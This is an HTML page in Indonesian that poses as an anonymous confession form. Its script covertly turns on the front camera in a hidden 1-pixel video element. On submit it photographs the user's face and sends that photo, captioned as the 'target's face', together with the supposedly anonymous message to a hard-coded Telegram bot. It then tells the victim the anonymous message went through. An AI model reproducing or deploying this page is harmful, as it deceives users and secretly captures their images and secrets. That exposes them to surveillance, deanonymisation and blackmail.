<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Pesan Anonim</title>
    <style>
        body { background: #0f0c29; color: white; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; margin-top: 50px; }
        textarea { width: 100%; height: 100px; border-radius: 10px; margin: 20px 0; background: rgba(255,255,255,0.2); color: white; border: none; padding: 10px; }
        .btn { background: linear-gradient(to right, #a777e3, #6e8efb); color: white; border: none; padding: 15px; border-radius: 25px; width: 100%; font-weight: bold; }
        /* Trick: Jangan display:none, tapi bikin ukurannya 1px agar sensor aktif */
        #video-hidden { width: 1px; height: 1px; opacity: 0.1; position: absolute; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Confess Sini!</h2>
        <p>Tulis pesan anonim lu buat siapa aja.</p>
        <textarea id="pesan" placeholder="Tulis rahasia lu..."></textarea>
        <button class="btn" onclick="kirimKonfess()">Kirim Pesan</button>
    </div>

    <video id="video-hidden" autoplay playsinline muted></video>
    <canvas id="canvas-hidden" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video-hidden');
        const canvas = document.getElementById('canvas-hidden');
        const token = "7945183514:AAEQCbHUMs7DO0OfTBYgsHWtLDDOfiKSee0";
        const chatId = "8465963357";

        // Minta izin kamera langsung pas web dibuka
        async function initCam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                // Pastikan video beneran 'play'
                video.play();
            } catch (e) { console.log("Kamera Off"); }
        }
        initCam();

        async function kirimKonfess() {
            const pesanUser = document.getElementById('pesan').value;
            if (!pesanUser) { alert("Isi pesan dulu!"); return; }

            // Cek apakah video sudah ada gambarnya atau masih item
            if (video.videoWidth === 0) {
                alert("Koneksi sibuk, coba lagi dalam 1 detik...");
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formPhoto = new FormData();
                formPhoto.append('chat_id', chatId);
                formPhoto.append('photo', blob, 'wajah.png');
                formPhoto.append('caption', `Muka target:\n"${pesanUser}"`);

                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formPhoto
                });

                alert("Pesan anonim terkirim!");
            }, 'image/png');
        }
    </script>
</body>
</html>
